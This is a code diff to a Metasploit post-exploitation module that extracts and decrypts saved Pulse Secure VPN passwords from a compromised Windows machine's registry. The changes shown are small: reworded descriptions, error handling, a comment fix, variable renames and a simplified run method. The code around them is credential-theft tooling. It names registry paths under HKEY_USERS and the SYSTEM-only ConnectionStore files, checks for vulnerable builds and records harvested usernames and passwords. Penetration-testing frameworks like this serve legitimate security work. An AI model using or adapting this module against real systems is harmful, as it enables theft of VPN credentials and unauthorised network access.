@@ -12,14 +12,15 @@ class MetasploitModule < Msf::Post
 
   def initialize(info={})
     super(update_info(info,
-      'Name'            => "Windows Gather Pulse Secure VPN Saved Password Extraction",
+      'Name'            => "Windows Pulse Secure Connect Client Saved Password Extractor",
       'Description'     => %q{
-        This module extracts and decrypts saved Pulse Secure VPN passwords from the
-        Windows Registry. This module can only access credentials created by the user the
-        process is running as.
-        It cannot link the password to a username because username is saved in
-        'C:\ProgramData\Pulse Secure\ConnectionStore\[SID].dat', which is only readable
-        by SYSTEM.
+        This module extracts and decrypts saved Pulse Secure Connect Client passwords from the
+        Windows Registry. This module can only access credentials created by the user that the
+        Meterpreter session is running as.
+        Note that this module cannot link the password to a username unless the
+        Meterpreter sessions is running as SYSTEM. This is because the username associated
+        with a password is saved in 'C:\ProgramData\Pulse Secure\ConnectionStore\[SID].dat',
+        which is only readable by SYSTEM.
         Note that for enterprise deployment, this username is almost always the domain
         username.
       },
@@ -32,7 +33,7 @@ class MetasploitModule < Msf::Post
       ],
       'Platform'        => ['win'],
       'SessionTypes'    => ['meterpreter'],
-      'Author'          => ['Quentin Kaiser <kaiserquentin@gmail.com>']
+      'Author'          => ['Quentin Kaiser <kaiserquentin[at]gmail.com>']
     ))
 
   end
@@ -91,7 +92,7 @@ class MetasploitModule < Msf::Post
     version_path = "C:\\Program Files (x86)\\Pulse Secure\\Pulse\\versionInfo.ini"
     begin
       if not session.fs.file.exist?(version_path)
-        raise Msf::Exploit::Failed, 'Pulse Secure Connect client is not installed on this system'
+        fail_with(Failure::NotVulnerable, 'Pulse Secure Connect client is not installed on this system')
       end
       version_data = session.fs.file.open(version_path).read.to_s
       matches = version_data.scan(/DisplayVersion=([0-9\.]*)/m)
@@ -143,7 +144,7 @@ class MetasploitModule < Msf::Post
   # These files are only readable by SYSTEM and contains connection details
   # for each IVE the user connected with. We use these details to extract
   # the actual username used to establish the VPN connection if the module
-  # runs with elevated privileges.
+  # was run as the SYSTEM user.
   #
   # @return [String, nil] the username used by user linked to `sid` when establishing
   # a connection with IVE `ive_index`, nil if none.
@@ -200,7 +201,7 @@ class MetasploitModule < Msf::Post
   # are represented within a two-bytes per char UTF-8 string. In order to
   # properly convert the hex bytes we're interested in, we first
   # convert the string from a two-bytes encoding to a one-byte encoding
-  # by getting rid of null bytes (e.g. \x00\x41 becomes \x00\x41).
+  # by getting rid of null bytes (e.g. \x00\x41 becomes \x41).
   #
   # Once converted, we can simply pack it back to raw hex bytes.
   #
@@ -226,7 +227,7 @@ class MetasploitModule < Msf::Post
     # for each user profile, we check for potential connection ive
     profiles.each do |profile|
       key_names = registry_enumkeys("HKEY_USERS\\#{profile['SID']}\\Software\\Pulse Secure\\Pulse\\User Data")
-      Array(key_names).each do |key_name|
+      key_names.each do |key_name|
         ive_index = key_name[4..-1] # remove 'ive:'
         # We get the encrypted password value from registry
         reg_path = "HKEY_USERS\\#{profile['SID']}\\Software\\Pulse Secure\\Pulse\\User Data\\ive:#{ive_index}"
@@ -331,8 +332,8 @@ class MetasploitModule < Msf::Post
             origin_type: :session,
             session_id: session_db_id,
             post_reference_name: self.refname,
-            username: client['username'],
-            private_data: client['password'],
+            username: creds['username'],
+            private_data: creds['password'],
             private_type: :password
           }
 
@@ -353,20 +354,16 @@ class MetasploitModule < Msf::Post
   end
 
   def run
-    begin
-      build = get_build
-      print_status("Target is running Pulse Secure Connect build #{build}.")
-      if vuln_builds.any? { |build_range| Gem::Version.new(build).between?(*build_range) }
-        print_good("This version is considered vulnerable.")
-      else
-        print_warning("This version is considered safe, but there might be leftovers from previous versions in the registry.")
-        if not is_system?
-          print_status("We recommend running this script in elevated mode to obtain credentials saved by recent versions.")
-        end
+    build = get_build
+    print_status("Target is running Pulse Secure Connect build #{build}.")
+    if vuln_builds.any? { |build_range| Gem::Version.new(build).between?(*build_range) }
+      print_good("This version is considered vulnerable.")
+    else
+      print_warning("This version is considered safe, but there might be leftovers from previous versions in the registry.")
+      if not is_system?
+        print_warning("We recommend running this script in elevated mode to obtain credentials saved by recent versions.")
       end
-      gather_creds
-    rescue Msf::Exploit::Failed => e
-      print_error(e.to_s)
     end
+    gather_creds
   end
 end
